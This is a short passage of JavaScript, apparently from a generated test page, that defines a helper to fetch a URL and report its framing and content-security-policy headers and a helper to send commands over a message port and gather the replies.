window.probe = async (url) => { try { const r = await fetch(url, { cache: 'no-store' }); const h = (n) => r.headers.get(n); const text = await r.text(); return { status: r.status, type: h('content-type'), xfo: h('x-frame-options'), csp: h('content-security-policy'), cspRO: h('content-security-policy-report-only'), hasMeta: text.includes('http-equiv="Content-Security-Policy"') }; } catch (e) { return { fetch: 'throws ' + e.name }; } };
window.cmd = (c, ms = 400) => new Promise((res) => { const got = []; const p = window.lastPort; const on = (m) => { got.push(m.data); }; p.addEventListener('message', on); p.postMessage({ cmd: c }); setTimeout(() => { p.removeEventListener('message', on); res(got); }, ms); });
</script></body></html>`;
}
